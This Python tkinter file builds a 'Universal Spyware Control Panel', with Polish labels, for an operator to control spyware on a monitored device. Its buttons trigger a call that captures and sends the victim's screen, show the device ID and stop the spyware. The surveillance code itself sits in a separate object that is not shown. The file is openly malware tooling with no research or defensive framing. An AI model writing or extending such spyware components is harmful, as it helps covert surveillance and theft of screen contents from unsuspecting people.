import tkinter as tk
from tkinter import ttk, messagebox
import threading
import time
from datetime import datetime

class SpywareGUI:
    def __init__(self, spyware_instance):
        self.spyware = spyware_instance
        self.root = None
        
    def create_gui(self):
        self.root = tk.Tk()
        self.root.title("Universal Spyware Control Panel")
        self.root.geometry("800x600")
        
        # Stylizacja
        style = ttk.Style()
        style.theme_use('clam')
        
        # Główne ramki
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Nagłówek
        header_frame = ttk.Frame(main_frame)
        header_frame.grid(row=0, column=0, columnspan=2, pady=10)
        
        title_label = ttk.Label(header_frame, text="Universal Spyware", font=("Arial", 16, "bold"))
        title_label.pack()
        
        # Status
        status_frame = ttk.Frame(main_frame)
        status_frame.grid(row=1, column=0, columnspan=2, pady=10)
        
        self.status_var = tk.StringVar(value="Stan: Gotowy")
        status_label = ttk.Label(status_frame, textvariable=self.status_var)
        status_label.pack()
        
        # Przyciski sterujące
        button_frame = ttk.Frame(main_frame)
        button_frame.grid(row=2, column=0, columnspan=2, pady=20)
        
        ttk.Button(button_frame, text="Zrób zrzut ekranu", 
                  command=self.take_screenshot).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(button_frame, text="Pobierz informacje", 
                  command=self.get_device_info).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(button_frame, text="Zatrzymaj spyware", 
                  command=self.stop_spyware).pack(side=tk.LEFT, padx=5)
        
        # Panel danych
        data_frame = ttk.LabelFrame(main_frame, text="Dane urządzenia", padding="10")
        data_frame.grid(row=3, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=10)
        
        self.data_text = tk.Text(data_frame, height=15, width=80)
        scrollbar = ttk.Scrollbar(data_frame, orient="vertical", command=self.data_text.yview)
        self.data_text.configure(yscrollcommand=scrollbar.set)
        
        self.data_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        scrollbar.grid(row=0, column=1, sticky=(tk.N, tk.S))
        
        # Logi
        log_frame = ttk.LabelFrame(main_frame, text="Logi", padding="10")
        log_frame.grid(row=4, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S), pady=10)
        
        self.log_text = tk.Text(log_frame, height=8, width=80)
        scrollbar_log = ttk.Scrollbar(log_frame, orient="vertical", command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=scrollbar_log.set)
        
        self.log_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        scrollbar_log.grid(row=0, column=1, sticky=(tk.N, tk.S))
        
        # Konfiguracja siatki
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(0, weight=1)
        main_frame.rowconfigure(3, weight=1)
        main_frame.rowconfigure(4, weight=1)
        
        # Dodaj logi do okna
        self.add_log("Interfejs graficzny uruchomiony")
    
    def add_log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_text.see(tk.END)
    
    def take_screenshot(self):
        self.add_log("Próba wykonania zrzutu ekranu...")
        try:
            # Tutaj wywołujemy funkcję zrzutu
            self.spyware.capture_and_send_screen()
            self.add_log("Zrzut ekranu wykonany i wysłany")
        except Exception as e:
            self.add_log(f"Błąd zrzutu ekranu: {e}")
    
    def get_device_info(self):
        self.add_log("Pobieranie informacji o urządzeniu...")
        try:
            # Tutaj można dodać pobieranie danych
            info = "Informacje o urządzeniu:\n"
            info += f"- ID: {self.spyware.device_id}\n"
            info += f"- Status: Aktywny\n"
            info += f"- Czas: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            
            self.data_text.delete(1.0, tk.END)
            self.data_text.insert(tk.END, info)
            self.add_log("Informacje o urządzeniu pobrane")
        except Exception as e:
            self.add_log(f"Błąd pobierania informacji: {e}")
    
    def stop_spyware(self):
        self.add_log("Zatrzymywanie spyware...")
        try:
            self.spyware.stop()
            self.status_var.set("Stan: Zatrzymany")
            messagebox.showinfo("Sukces", "Spyware zostało zatrzymane")
        except Exception as e:
            self.add_log(f"Błąd zatrzymywania: {e}")
    
    def run(self):
        self.create_gui()
        self.root.mainloop()
